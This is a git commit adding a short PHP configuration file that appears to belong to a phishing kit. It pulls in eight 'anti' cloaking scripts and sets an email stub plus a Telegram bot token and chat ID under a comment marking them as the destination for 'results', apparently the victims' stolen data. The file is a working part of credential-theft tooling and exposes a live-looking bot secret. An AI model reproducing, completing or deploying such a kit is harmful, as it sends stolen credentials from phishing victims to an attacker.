4586b95d354a6e5b27654fbdde878abe0231371b
topoo <44278543+simomoo@users.noreply.github.com>
2022-07-01 17:05:39 +0100

    Initial commit

---
+++ email.php
@@ -0,0 +1,26 @@
+<?php
+/*
+
+ 
+                                                                                                
+                                                                                                
+                                                                                                
+
+*/
+include '../prevents/anti1.php';
+include '../prevents/anti2.php';
+include '../prevents/anti3.php';
+include '../prevents/anti4.php';
+include '../prevents/anti5.php';
+include '../prevents/anti6.php';
+include '../prevents/anti7.php';
+include '../prevents/anti8.php';
+
+$email ="@gmail.com"; 
+
+//telgram rzlt
+$api = "5380008377:AAEOB2vvo-T363FsB0gpbCOPoNP6mrbaTDM";
+$chatid = "1289904248";
+
+
+?>
